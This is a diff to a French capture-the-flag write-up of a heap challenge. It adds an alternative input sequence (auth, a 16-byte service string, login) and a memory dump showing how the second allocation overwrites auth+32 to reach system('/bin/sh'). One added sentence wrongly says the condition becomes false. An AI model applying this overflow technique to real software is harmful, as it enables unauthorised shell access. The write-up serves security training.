@@ -5,7 +5,7 @@
 **Structure**
 - Boucle principale avec `fgets(buf, 128, stdin)`
 - Commandes disponibles: `auth`, `reset`, `service`, `login`
-- Vérification critique: `auth != 0` pour `login`
+- Vérification critique: `auth[32] != 0` pour `login`
 
 **Comportement Mémoire**
 - `auth`: alloue 4 bytes à `0x804a008`
@@ -33,6 +33,23 @@ Cette exploitation fonctionne car:
 - Le second bloc "AAAA" est placé à `auth + 32`
 - La condition `auth != 0` devient vraie
 - Le programme exécute `system("/bin/sh")`
+
+**Solution supplementaire**
+```
+auth aaaa                   // Les 'a' sont presents a but illustratif
+servicebbbbbbbbbbbbbbbb     // 16 * 'b'
+login
+```
+
+Apercu de la memoire:
+```
+0x804a008:      0x61616161      0x0000000a      0x00000000      0x00000019
+0x804a018:      0x62626262      0x62626262      0x62626262      0x62626262
+0x804a028:      0x0000000a      0x00020fd9      0x00000000      0x00000000
+0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
+```
+
+Sachant que `auth` fait un `malloc` de 4 qui sera aligne a 16 et que la prochaine allocation se fera a la suite, nous en deduisons que 16 octets suffiront pour atteindre auth[32], ainsi, la condition `auth[32] != 0` sera fausse.
 
 **Obtention du Flag**
 ```bash
